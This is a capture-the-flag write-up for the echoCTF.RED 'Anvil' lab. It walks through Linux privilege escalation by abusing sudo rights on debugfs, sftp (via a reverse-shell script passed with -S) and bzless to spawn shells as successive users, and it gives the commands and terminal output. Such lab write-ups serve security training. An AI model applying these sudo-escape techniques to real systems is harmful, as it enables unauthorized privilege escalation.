---
layout: default
title : muzec - Anvil - echoCTF.RED
---


How's your OS escalation skills? See if you can reach the final user `(ETSCTF)`

On each user you successfully escalate, there will be a flag on its home directory. This flag can also be used as a password to directly switch to that user (eg with `su - copper`) at a later time so that you dont have to go through all the steps every time you re-connect.

To start the challenge connect with `nc -t 10.0.40.10 1337`, or `telnet 10.0.40.10 1337`. Your timer starts from the first time you connect to the service.

Let jump in without wasting to much of time.

### Shell As Silver

```
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/anvil]
└─$ nc -t 10.0.40.10 1337
copper@anvil:~$ sudo -l
sudo -l
User copper may run the following commands on anvil:
    (silver) NOPASSWD: /sbin/debugfs
copper@anvil:~$ id
id
uid=1001(copper) gid=1001(copper) groups=1001(copper)
copper@anvil:~$ sudo -u silver /sbin/debugfs
sudo -u silver /sbin/debugfs
debugfs 1.44.5 (15-Dec-2018)
debugfs:  !sh
!sh
$ id
id
uid=1002(silver) gid=1002(silver) groups=1002(silver)
$ 
```

So i confirm if i can run `sudo` with any command luckily i got `/sbin/debugfs` which was exploited above let move to another user.

### Shell As Gold

```
silver@anvil:/home/copper$ sudo -l
sudo -l
User silver may run the following commands on anvil:
    (gold) NOPASSWD: /usr/bin/sftp
silver@anvil:/home/copper$ 
```
Seems we can run `sftp` with `sudo` which is cool let exploit it.

![image](https://user-images.githubusercontent.com/69868171/144639819-78ee125c-e12e-4ad5-9cc7-70135f5b3392.png)

But seems like a dead we know SSH port running interesting so i decided to host an SSH port on the target using `SimpleHTTPServer` .

![image](https://user-images.githubusercontent.com/69868171/144640070-9892bf49-4c1a-41cf-b995-dbef7f861aa7.png)

Ready and running let try it again.

![image](https://user-images.githubusercontent.com/69868171/144640226-08361720-b7db-45b8-8700-1dfc3422bd35.png)

Seems like a dead end again i can't create `.ssh` directory so i change directory to `/tmp` to host a bash shell in a file with a reverse shell payload in it.

![image](https://user-images.githubusercontent.com/69868171/144640692-f88e455d-cf78-441e-89e3-19407ae5e4b5.png)

But ready and making it executable also with an Ncat listener on now let hit it.

```
sudo -u gold /usr/bin/sftp -S /tmp/shell.sh muzec@localhost
```

![image](https://user-images.githubusercontent.com/69868171/144640989-cfa31789-216e-414f-ba68-310439f8d912.png)

Boom we have shell.

### Shell As ETSCTF

![image](https://user-images.githubusercontent.com/69868171/144641377-03bbcd58-d33d-4f20-bd4d-57b0111d0073.png)

```
sudo -u ETSCTF /bin/bzless -h
```

![image](https://user-images.githubusercontent.com/69868171/144641592-1d349563-430e-428e-97d2-43ae66202e71.png)

```
!sh
```

We are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
